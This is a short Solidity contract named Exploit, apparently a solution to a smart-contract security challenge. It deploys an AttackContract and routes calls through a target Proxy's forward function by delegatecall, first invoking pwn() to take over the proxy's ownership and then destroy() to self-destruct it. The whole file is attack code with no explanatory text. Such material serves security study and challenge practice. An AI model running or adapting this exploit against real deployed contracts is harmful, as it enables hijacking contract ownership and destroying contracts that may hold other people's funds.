pragma solidity ^0.4.24;

import "./Proxy.sol"; // Optional if interacting externally

contract Exploit {
    Proxy public target;
    AttackContract public malicious;

    constructor(address _target) public {
        target = Proxy(_target);
        malicious = new AttackContract();
    }

    function takeOverOwnership() public {
        // Call pwn() via delegatecall
        bytes memory data = abi.encodeWithSignature("pwn()");
        target.forward(address(malicious), data);
    }

    function destroyProxy() public {
        // Call destroy() via delegatecall
        bytes memory data = abi.encodeWithSignature("destroy()");
        target.forward(address(malicious), data);
    }
}

